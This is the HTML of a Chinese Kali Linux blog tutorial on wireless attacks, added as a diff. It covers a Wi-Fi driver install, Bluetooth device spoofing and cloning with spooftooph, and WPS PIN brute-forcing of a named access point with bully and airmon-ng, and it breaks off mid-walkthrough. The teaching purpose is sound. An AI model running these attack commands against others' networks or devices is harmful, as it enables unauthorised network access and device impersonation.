@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="变化无常">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/11/20/6-kl-tool/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali-Linux-Tools-无线攻击-(1)">
+<meta property="og:url" content="http://example.com/2023/11/20/6-Kl-tool/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Kali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/14-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/15-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/16-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/00-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/01-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/02-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/03-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/04-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/18-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/17-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/19-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/05-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/06-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/07-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/08-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/09-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/10-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/11-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/12-kali-WA.jpg">
+<meta property="og:image" content="http://example.com/image/Kali-Linux/06-WA/13-kali-WA.jpg">
+<meta property="article:published_time" content="2023-11-20T01:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-04T09:05:48.415Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Kali-Attack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/Kali-Linux/06-WA/14-kali-WA.jpg">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/skull.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/skull.svg">
+    <meta name="theme-color" content="#a7a7a7">
+    <link rel="shortcut icon" href="/images/skull.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Kali-Linux-Tools-无线攻击-(1) -
+        
+        移商换羽
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Farsan&display=swap" rel="stylesheet">
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["JunChen"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":false,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#a7a7a7","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":true,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Everfamous","subtitle":{"text":["莫回首，管它黄鹤去何楼......"],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"逍遥游","artist":"吴佳明","url":"/song/xiaoyaoyou.mp3","cover":"/image/Music/XiaoYaoYou.jpg"},{"name":"李伯伯要去当红军","artist":"张玮玮和郭龙","url":"/song/libaibai.mp3","cover":"/image/Music/libaibai.jpg"},{"name":"Life Will Change","artist":"Lyn","url":"/song/LifeWillChange.mp3","cover":"/image/Music/P5.jpg"},{"name":"蓝色多瑙河","artist":"小约翰·施特劳斯","url":"/song/op314.mp3","cover":"/image/Music/JS.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.4.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/LiShiKeDaiBiaoLJC/LiShiKeDaiBiaoLJC.github.io"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"浅眠一梦，不曾醉酒","links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}}},"article_date_format":"YYYY-MM-DD","categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/6 12:12:12"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="http://example.com/">
+                    <img src="/images/c.svg">
+                </a>
+            
+            <a class="logo-title" href="http://example.com/">
+                
+                移商换羽
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags/"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-tags"></i>
+                                        
+                                        标签
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-folder"></i>
+                                        
+                                        分类
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/LiShiKeDaiBiaoLJC/LiShiKeDaiBiaoLJC.github.io">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags/"  >
+                             
+                                
+                                    <i class="fa-solid fa-tags"></i>
+                                
+                                标签
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-solid fa-folder"></i>
+                                
+                                分类
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/LiShiKeDaiBiaoLJC/LiShiKeDaiBiaoLJC.github.io">GITHUB</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                
+                
+                <img src="/image/Hexo/Kali-Linux-6-1.jpg" alt="Kali-Linux-Tools-无线攻击-(1)" class="max-w-none"/>
+                
+                <h1 class="article-title-cover">Kali-Linux-Tools-无线攻击-(1)</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/d.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">变化无常</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-11-20 09:00</span>
+        <span class="mobile">2023-11-20 09:00</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-01-04 17:05:48</span>
+            <span class="mobile">2024-01-04 17:05:48</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Kali-linux/">Kali-linux</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Kali-Attack/">Kali-Attack</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h2 id="Kali-无线攻击介绍"><a href="#Kali-无线攻击介绍" class="headerlink" title="Kali-无线攻击介绍"></a>Kali-无线攻击介绍</h2><p>Kali Linux 攻击分类包含了信息搜集、漏洞分析、Web程序、数据库评估软件、密码攻击、无线攻击、逆向工程、漏洞利用工具集、嗅探&#x2F;欺骗、权限维持、数字取证、报告工具集、Social Engineering Tools(社会工程工具)。一共十三项，本章介绍的是Kali中的无线攻击内容，主要分为蓝牙工具集和无线工具集。</p>
+<h2 id="Kali-linux-8821cu-无线网卡安装"><a href="#Kali-linux-8821cu-无线网卡安装" class="headerlink" title="Kali-linux 8821cu-无线网卡安装"></a>Kali-linux 8821cu-无线网卡安装</h2><p>首先查看usb接口</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsusb</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/14-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>命令刷新软件源缓存</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt update</span><br></pre></td></tr></table></figure></div>
+
+<p>之后更新内核</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ apt   install    linux-image-amd64   -y   (64位系统执行这条)</span><br><span class="line">$ apt   install    linux-image-686-pae  -y  (32位系统执行这条）</span><br></pre></td></tr></table></figure></div>
+
+<p>更新内核后重启系统以加载新内核</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure></div>
+
+<p>安装内核的头文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo  apt   install  linux-headers-amd64    -y （64位系统执行这条)  </span><br><span class="line">$ sudo  apt   install  linux-headers-686-pae  -y  (32位系统执行这条)</span><br></pre></td></tr></table></figure></div>
+
+<p>安装相关编译工具</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt   install    build-essential  bc  dkms  git  libelf-dev  -y</span><br></pre></td></tr></table></figure></div>
+
+<p>之后将github上的驱动源头</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/morrownr/8821cu-20210916</span><br></pre></td></tr></table></figure></div>
+
+<p>进入驱动模块目录并安装驱动</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> 8821cu-20210916</span><br><span class="line">$ ./install-driver.sh</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/15-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>最后结果显示</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/16-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<h2 id="蓝牙工具集"><a href="#蓝牙工具集" class="headerlink" title="蓝牙工具集"></a>蓝牙工具集</h2><h3 id="spooftooph-蓝牙设备伪造克隆工具"><a href="#spooftooph-蓝牙设备伪造克隆工具" class="headerlink" title="spooftooph-蓝牙设备伪造克隆工具"></a>spooftooph-蓝牙设备伪造克隆工具</h3><p>克隆并记录蓝牙设计信息生成随机的新蓝牙配置文件，每隔X秒更改蓝牙配置文件指定蓝牙接口的设备信息从扫码日志中选择要克隆的设备.<br>PS:要修改蓝牙适配器，必须以root权限运行spooftooth.<br>Spooftooph提供五种使用模式：</p>
+<p>1、指定NAME，CLASS和ADDR。<br>root @ test：spooftooph -i hci0 -n new_name -a 00：11：22：33：44：55 -c 0x1c010c</p>
+<p>2、随机生成NAME，CLASS和ADDR。<br>root @ test：spooftooph -i hci0 -R</p>
+<p>3、扫描范围内的设备并选择要克隆的设备。（可选）将设备信息转储到指定的日志文件中。<br>root @ test：spooftooph -i hci0 -s -w file.csv</p>
+<p>4、从日志文件加载设备信息并指定要克隆的设备信息。<br>root @ test：spooftooph -i hci0 -r file.csv</p>
+<p>5、每隔x秒在范围内克隆随机设备信息。<br>root @ test：spooftooph -i hci0 -t 10</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ spooftooph -i dev [-mstu] [-nac] | [-R] | [-r file] [-w file] </span><br><span class="line"><span class="comment"># -a &lt;address&gt;：指定新的BD_ADDR </span></span><br><span class="line"><span class="comment"># -b &lt;num_lines&gt;：每个要显示的蓝牙配置文件数页面</span></span><br><span class="line"><span class="comment"># -B：对于较小的屏幕禁用横幅（如手机）</span></span><br><span class="line"><span class="comment"># -c &lt;类&gt;：指定新类</span></span><br><span class="line"><span class="comment"># -h：帮助</span></span><br><span class="line"><span class="comment"># -i &lt;开发&gt;：指定接口</span></span><br><span class="line"><span class="comment"># -m：选择在指定多个接口</span></span><br><span class="line"><span class="comment"># -n &lt;名&gt;：指定新名称</span></span><br><span class="line"><span class="comment"># -r &lt;文件&gt;：读入CSV日志文件</span></span><br><span class="line"><span class="comment"># -R：分配随机名称，CLASS和ADDR </span></span><br><span class="line"><span class="comment"># -s：扫描本地区域中的设备</span></span><br><span class="line"><span class="comment"># -t &lt;时间&gt;：克隆设备的时间间隔</span></span><br><span class="line"><span class="comment"># -u：USB延迟。用于重新初始化接口</span></span><br><span class="line"><span class="comment"># -w &lt;file&gt;的交互式延迟：写入CSV日志文件（在必须通过USB时在虚拟化环境中有用。）</span></span><br></pre></td></tr></table></figure></div>
+
+<p>常见使用方式</p>
+<p>1.指定名称、类别和地址</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ spooftooph -i hci0 -n new_name -a 00:11:22:33:44:55 -c 0x1c010c</span><br></pre></td></tr></table></figure></div>
+<p>PS:这里，-a用于指定新地址 -c用于指定新类。</p>
+<p>2.创建一个随机的蓝牙配置文件<br>使用-R参数来分配随机名称、类和地址</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ spooftooph -R</span><br></pre></td></tr></table></figure></div>
+
+
+<p>3.扫码蓝牙设备<br>使用欺骗，我们还可以扫码范围内的设备并选择要克隆的设备<br>-s 参数用于扫码本地区域的设备<br>-w 将用于设备信息的保存在日志文件中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ spooftooph -i hci0 -s -w file.csv</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/00-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/01-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>在上述example中附件没有蓝牙设备。但是，当运行该命令时，附近的蓝牙设备会出现</p>
+<p>4.从日志文件中克隆设备信息</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ spooftooph -i hci0 -r file.csv</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/02-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/03-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>5.每X秒更改一次蓝牙配置文件<br>指定的时间间隔内更改蓝牙的配置文件或设备信息，使用-t参数运行下列命令：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ spooftooph -i hci0 -t 10</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/04-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>推荐：⭐⭐ 不是非常推荐</p>
+<h2 id="无线工具集"><a href="#无线工具集" class="headerlink" title="无线工具集"></a>无线工具集</h2><h3 id="bully"><a href="#bully" class="headerlink" title="bully"></a>bully</h3><p>描述:是 WPS 穷举法的一个新实现，用 c 语言编写。它在概念上与其他程序相同，因为它利用了 WPS 规范中的(现在众所周知的)设计缺陷。与原始的reaver 代码相比，它有几个优点。其中包括减少依赖项、改进内存和 cpu 性能、正确处理 endianness 以及更健壮的选项集。它运行在 Linux 上，并且是专门为在嵌入式 Linux 系统(OpenWrt 等)上运行而开发的，无论其体系结构如何。<br>必需参数：<br>-b,–bssid macaddr 目标接入点的MAC地址<br>-e,–essid string 接入点的扩展SSID<br>可选参数：<br>-c,–channel N[,N…]AP的信道号或要跳的列表[b &#x2F;g]<br>-i,–index N 启动pin索引（7或8位数字）[自动]<br>-l,–lockwait N 如果AP锁定WPS，则要等待的秒数[43]<br>-o,–outfile file 消息输出文件<br>-p,–pin N 启动pin号(7位或8位)[自动]<br>-s,–source macaddr 源(硬件)MAC地址[探针]<br>-u,–luaLua脚本文件</p>
+<p>在kali下进行的操作<br>首先先确认我们的无线连接及其名称：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iwconfig</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/18-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>设置你的无线网卡为监听模式<br>也就是有线连接上的混杂模式类似。它能够让我们看到所有广播传递到我们的无线网卡的数据报。<br>我们可以使用工具 Airmon-ng来完成这个任务。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airmon-ng start wlan0</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/17-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>接下来，我们需要使用Airodump-ng 来查看我们周围的无线AP信息</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng [wifi 网卡的名称]</span><br></pre></td></tr></table></figure></div>
+<p>这样我们就可以看到几个AP </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/19-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>然后将上述步骤内容中查看到的相关信息，填入我们的Bully命令中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bully mon0 -b 00:25:9C:97:4F:48 -e Mandela2 -c 9</span><br></pre></td></tr></table></figure></div>
+<p>分解命令<br>mon0： 监听模式下无线网卡名<br>-b： 00:25:9C:97:4F:48<br>-e：Mandela2 AP SSID<br>-c：9是P正在广播的信道</p>
+<p>这些信息都可以在Airodump-ng的界面上找到</p>
+<p>其中，用于实施WPS认证破解的语法格式如下：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bully --bssid [AP的MAC地址] -c [channel] [interface] -vv</span><br></pre></td></tr></table></figure></div>
+<p>-interface：指定监听的无线网络接口</p>
+<p>-b，–bssid：指定目标AP的MAC地址。</p>
+<p>-c，–channel：指定目标AP工作的信道。</p>
+<p>-vv：显示更详细的信息。</p>
+<p>使用Bully工具破解WPS加密。执行命令如下：</p>
+<div class="note-large red"><div class="notel-title"><p>Bully攻击流程-1</p>
